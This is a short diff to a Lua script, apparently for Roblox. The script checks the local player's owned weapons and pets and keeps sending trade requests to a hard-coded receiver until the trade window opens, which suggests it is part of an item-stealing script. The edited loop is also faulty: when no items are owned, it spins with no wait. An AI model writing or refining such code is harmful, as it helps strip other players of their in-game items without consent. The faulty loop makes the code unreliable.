@@ -92,11 +92,13 @@ local function baiiii()
     local ownedWeapons, ownedPets = inventoryMeow()
     print(ownedWeapons, ownedPets)
 
-    while ownedWeapons or ownedPets and not (tradeGUI and tradeGUI.Enabled) do
-        wait(1)
-        local target = game:GetService("Players"):FindFirstChild(receiverName)
-        ReplicatedStorage.Trade.SendRequest:InvokeServer(target)
-        tradeGUI = Players.LocalPlayer.PlayerGui.TradeGUI
+    while not (tradeGUI and tradeGUI.Enabled) do
+        if ownedWeapons or ownedPets then
+            wait(1)
+            local target = game:GetService("Players"):FindFirstChild(receiverName)
+            ReplicatedStorage.Trade.SendRequest:InvokeServer(target)
+            tradeGUI = Players.LocalPlayer.PlayerGui.TradeGUI
+        end
     end
     print("Trade GUI is open!")
 
